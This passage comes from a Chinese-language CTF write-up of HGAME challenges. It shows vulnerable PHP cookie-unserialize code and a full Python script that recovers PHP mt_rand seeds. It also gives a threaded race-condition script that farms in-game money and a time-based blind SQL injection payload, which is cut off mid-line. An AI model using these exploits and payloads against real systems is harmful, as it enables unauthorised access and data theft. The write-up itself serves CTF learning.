class="string">&#x27;monster&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            header(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monster</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $monsterData;</span><br><span class="line">    <span class="keyword">private</span> $encryptKey;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;encryptKey = $key;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;monster&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Set();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $monsterData = base64_decode($_COOKIE[<span class="string">&#x27;monster&#x27;</span>]);  </span><br><span class="line">        <span class="keyword">if</span>(strlen($monsterData) &gt; <span class="number">32</span>)&#123;              </span><br><span class="line">            $sign = substr($monsterData, <span class="number">-32</span>);</span><br><span class="line">            $monsterData = substr($monsterData, <span class="number">0</span>, strlen($monsterData) - <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span>(md5($monsterData . <span class="keyword">$this</span>-&gt;encryptKey) === $sign)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;monsterData = unserialize($monsterData); </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                session_start();</span><br><span class="line">                session_destroy();</span><br><span class="line">                setcookie(<span class="string">&#x27;monster&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                header(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;Set();     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Set</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $monsterName = [<span class="string">&#x27;无名小怪&#x27;</span>, <span class="string">&#x27;BOSS: The Kernal Cosmos&#x27;</span>, <span class="string">&#x27;小怪: Big Eggplant&#x27;</span>, <span class="string">&#x27;BOSS: The Mole King&#x27;</span>, <span class="string">&#x27;BOSS: Zero Zone Witch&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;monsterData = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span> =&gt; $monsterName[array_rand($monsterName, <span class="number">1</span>)],</span><br><span class="line">            <span class="string">&#x27;no&#x27;</span> =&gt; rand(<span class="number">1</span>, <span class="number">2000</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Save();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;monsterData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">Save</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $sign = md5(serialize(<span class="keyword">$this</span>-&gt;monsterData) . <span class="keyword">$this</span>-&gt;encryptKey);</span><br><span class="line">        setcookie(<span class="string">&#x27;monster&#x27;</span>, base64_encode(serialize(<span class="keyword">$this</span>-&gt;monsterData) . $sign));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二发入魂！"><a href="#二发入魂！" class="headerlink" title="二发入魂！"></a>二发入魂！</h4><p>这里提供一个新思路来算出种子：<a href="https://www.ambionics.io/blog/php-mt-rand-prediction">https://www.ambionics.io/blog/php-mt-rand-prediction</a></p><p>安全客翻译文章：<a href="https://www.anquanke.com/post/id/196831">https://www.anquanke.com/post/id/196831</a></p><p>简单的说，就是如果知道某个随机数的值以及这个随机数前随机数的个数，并且知道与相隔226个随机数的的值，就可以算出seed，当然这个随机数可以是第一个随机数，这时候只需知道第227个随机数的值就可以了</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3.7</span></span><br><span class="line"><span class="comment"># Charles Fol</span></span><br><span class="line"><span class="comment"># @cfreal_</span></span><br><span class="line"><span class="comment"># 2020-01-04 (originally la long time ago ~ 2010)</span></span><br><span class="line"><span class="comment"># Breaking mt_rand() with two output values and no bruteforce.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">R = final rand value</span></span><br><span class="line"><span class="string">S = merged state value</span></span><br><span class="line"><span class="string">s = original state value</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">N = <span class="number">624</span></span><br><span class="line">M = <span class="number">397</span></span><br><span class="line"></span><br><span class="line">MAX = <span class="number">0xffffffff</span></span><br><span class="line">MOD = MAX + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># STATE_MULT * STATE_MULT_INV = 1 (mod MOD)</span></span><br><span class="line">STATE_MULT = <span class="number">1812433253</span></span><br><span class="line">STATE_MULT_INV = <span class="number">2520285293</span></span><br><span class="line"></span><br><span class="line">MT_RAND_MT19937 = <span class="number">1</span></span><br><span class="line">MT_RAND_PHP = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_initialize</span>(<span class="params">seed</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Creates the initial state array from a seed.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    state = [<span class="literal">None</span>] * N</span><br><span class="line">    state[<span class="number">0</span>] = seed &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N):</span><br><span class="line">        r = state[i<span class="number">-1</span>]</span><br><span class="line">        state[i] = ( STATE_MULT * ( r ^ (r &gt;&gt; <span class="number">30</span>) ) + i ) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_initialize</span>(<span class="params">s, p</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;From an initial state value `s` at position `p`, find out seed.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># We have:</span></span><br><span class="line">    <span class="comment"># state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] &gt;&gt; 30) + i )) % 100000000</span></span><br><span class="line">    <span class="comment"># and:</span></span><br><span class="line">    <span class="comment"># (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse)</span></span><br><span class="line">    <span class="comment"># =&gt; 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] &gt;&gt; 30) ) (mod 100000000)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(p, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        s = _undo_php_mt_initialize(s, i)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_undo_php_mt_initialize</span>(<span class="params">s, i</span>):</span></span><br><span class="line">    s = (STATE_MULT_INV * (s - i)) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> s ^ s &gt;&gt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_rand</span>(<span class="params">s1</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Converts a merged state value `s1` into a random value, then sent to the</span></span><br><span class="line"><span class="string">    user.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt;  <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_rand</span>(<span class="params">s1</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Retrieves the merged state value from the value sent to the user.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    </span><br><span class="line">    s1 = undo_lshift_xor_mask(s1, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">    </span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">11</span></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">22</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_lshift_xor_mask</span>(<span class="params">v, shift, mask</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;r s.t. v = r ^ ((r &lt;&lt; shift) &amp; mask)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(shift, <span class="number">32</span>, shift):</span><br><span class="line">        v ^= (bits(v, i - shift, shift) &amp; bits(mask, i, shift)) &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits</span>(<span class="params">v, start, size</span>):</span></span><br><span class="line">    <span class="keyword">return</span> lobits(v &gt;&gt; start, size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lobits</span>(<span class="params">v, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; ((<span class="number">1</span> &lt;&lt; b) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit</span>(<span class="params">v, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; (<span class="number">1</span> &lt;&lt; b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bv</span>(<span class="params">v, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> bit(v, b) &gt;&gt; b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_reload</span>(<span class="params">state, flavour</span>):</span></span><br><span class="line">    s = state</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, N - M):</span><br><span class="line">        s[i] = _twist_php(s[i+M], s[i], s[i+<span class="number">1</span>], flavour)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N - M, N - <span class="number">1</span>):</span><br><span class="line">        s[i] = _twist_php(s[i+M-N], s[i], s[i+<span class="number">1</span>], flavour)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_twist_php</span>(<span class="params">m, u, v, flavour</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Emulates the `twist` and `twist_php` #defines.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span> <span class="keyword">if</span> (u <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">else</span> v) &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> m ^ (((u &amp; <span class="number">0x80000000</span>) | (v &amp; <span class="number">0x7FFFFFFF</span>)) &gt;&gt; <span class="number">1</span>) ^ mask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_reload</span>(<span class="params">S000, S227, offset, flavour</span>):</span></span><br><span class="line">    <span class="comment">#define twist_php(m,u,v)  (m ^ (mixBits(u,v)&gt;&gt;1) ^ ((uint32_t)(-(int32_t)(loBit(u))) &amp; 0x9908b0dfU))</span></span><br><span class="line">    <span class="comment"># m S000</span></span><br><span class="line">    <span class="comment"># u S227</span></span><br><span class="line">    <span class="comment"># v S228</span></span><br><span class="line">    X = S000 ^ S227</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># This means the mask was applied, and as such that S227&#x27;s LSB is 1</span></span><br><span class="line">    s22X_0 = bv(X, <span class="number">31</span>)</span><br><span class="line">    <span class="comment"># remove mask if present</span></span><br><span class="line">    <span class="keyword">if</span> s22X_0:</span><br><span class="line">        X ^= <span class="number">0x9908b0df</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Another easy guess</span></span><br><span class="line">    s227_31 = bv(X, <span class="number">30</span>)</span><br><span class="line">    <span class="comment"># remove bit if present</span></span><br><span class="line">    <span class="keyword">if</span> s227_31:</span><br><span class="line">        X ^= <span class="number">1</span> &lt;&lt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># We&#x27;re missing bit 0 and bit 31 here, so we have to try every possibility</span></span><br><span class="line">    s228_1_30 = (X &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> s228_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> s228_31 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_MT19937 <span class="keyword">and</span> s22X_0 != s228_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s228 = s228_0 | s228_31 &lt;&lt; <span class="number">31</span> | s228_1_30</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the results are consistent with the known bits of s227</span></span><br><span class="line">            s227 = _undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">and</span> bv(s227, <span class="number">0</span>) != s22X_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> bv(s227, <span class="number">31</span>) != s227_31:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Check if the guessed seed yields S000 as its first scrambled state</span></span><br><span class="line">            rand = undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            state = php_mt_initialize(rand)</span><br><span class="line">            php_mt_reload(state, flavour)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (S000 == state[offset]):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> rand</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">_R000, _R227, offset, flavour</span>):</span></span><br><span class="line">    <span class="comment"># Both were &gt;&gt; 1, so the leftmost byte is unknown</span></span><br><span class="line">    _R000 &lt;&lt;= <span class="number">1</span></span><br><span class="line">    _R227 &lt;&lt;= <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> R000_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> R227_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            R000 = _R000 | R000_0</span><br><span class="line">            R227 = _R227 | R227_0</span><br><span class="line">            S000 = undo_php_mt_rand(R000)</span><br><span class="line">            S227 = undo_php_mt_rand(R227)</span><br><span class="line">            seed = undo_php_mt_reload(S000, S227, offset, flavour)</span><br><span class="line">            <span class="keyword">if</span> seed:</span><br><span class="line">                <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_do_undo</span>(<span class="params">do, undo</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">        rand = random.randrange(<span class="number">1</span>, MAX)</span><br><span class="line">        done = do(rand)</span><br><span class="line">        undone = undo(done)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> rand == undone:</span><br><span class="line">            print(<span class="string">f&quot;-- <span class="subst">&#123;i&#125;</span> ----&quot;</span>)</span><br><span class="line">            print(bin(rand).rjust(<span class="number">34</span>))</span><br><span class="line">            print(bin(undone).rjust(<span class="number">34</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    test_do_undo(</span><br><span class="line">        php_mt_initialize,</span><br><span class="line">        <span class="keyword">lambda</span> s: undo_php_mt_initialize(s[<span class="number">227</span>], <span class="number">227</span>)</span><br><span class="line">    )</span><br><span class="line">    test_do_undo(</span><br><span class="line">        php_mt_rand,</span><br><span class="line">        undo_php_mt_rand</span><br><span class="line">    )</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># test()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://twoshot.hgame.n3ko.co/&quot;</span></span><br><span class="line">req = requests.session()</span><br><span class="line">r = req.get(url+<span class="string">&quot;random.php?times=228&quot;</span>)</span><br><span class="line"><span class="comment"># print(r.content)</span></span><br><span class="line">data = json.loads(r.text)</span><br><span class="line">seed = main(data[<span class="number">0</span>], data[len(data)<span class="number">-1</span>], <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">r = req.post(url+<span class="string">&quot;verify.php&quot;</span>, data=&#123;<span class="string">&quot;ans&quot;</span>:seed&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>exp中的main函数，第一个参数是某个随机数的值，第二个参数是与这个随机数相隔226个随机数的随机数的值，第三个参数是这个随机数前面随机数的个数，第四个参数是php的版本，0代表php5，1代表php7</p><h4 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h4><p>题目考察的是条件竞争，真没想到,exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">worker</span>(<span class="params">i,data</span>):</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">url=<span class="string">&quot;&#123;&#125;?method=solve&quot;</span>.format(host)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">url=<span class="string">&quot;&#123;&#125;?method=buy&quot;</span>.format(host)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.post(url=url,data=data)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;请求失败&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://121.36.88.65:9999/API/&quot;</span></span><br><span class="line">user=&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>:<span class="string">&quot;roc&quot;</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">s=requests.session()</span><br><span class="line">s.post(url=<span class="string">&quot;&#123;&#125;?method=login&quot;</span>.format(host),data=user)</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;code&quot;</span>:<span class="string">&#x27;800001&#x27;</span>,</span><br><span class="line"><span class="string">&quot;amount&quot;</span>:<span class="string">&#x27;500&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">info=json.loads(s.get(<span class="string">&quot;&#123;&#125;?method=getinfo&quot;</span>.format(host)).text)</span><br><span class="line">money=info[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;money&#x27;</span>]</span><br><span class="line">properties=info[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;properties&#x27;</span>]</span><br><span class="line">print(money)</span><br><span class="line">print(properties)</span><br><span class="line"><span class="keyword">if</span> money&gt;<span class="number">100000000</span>:</span><br><span class="line">print(s.get(<span class="string">&quot;&#123;&#125;?method=getflag&quot;</span>.format(host)).text)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">amount=int(properties[<span class="number">0</span>][<span class="string">&#x27;amount&#x27;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">amount=money//<span class="number">10000</span></span><br><span class="line"><span class="keyword">if</span> amount&gt;<span class="number">500</span>:</span><br><span class="line">amount=<span class="number">500</span></span><br><span class="line">data[<span class="string">&#x27;amount&#x27;</span>]=amount</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">t=threading.Thread(target=worker,args=(i,data))</span><br><span class="line">t.start()</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">i+=<span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="Cosmos的留言板-2"><a href="#Cosmos的留言板-2" class="headerlink" title="Cosmos的留言板-2"></a>Cosmos的留言板-2</h4><p>按照留言板1，猜测这题就是sql注入，最后在删除的位置存在盲注</p><p>直接用sqlmap跑出来了😂</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200204204426.png" style="zoom:80%;"><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">method=<span class="keyword">delete</span>&amp;delete_id=(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">5147</span>=<span class="number">5147</span>) <span class="keyword">THEN</span> <span class="keyword">SLEEP</span>(<span class="number">5</span>) <span class="keyword">ELSE</span> <span class="number">5147</span> <span class="keyword">END</span>)</span><br><span class="line">举个例子：</span><br><span class="line">(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">IFNULL</span>(<span 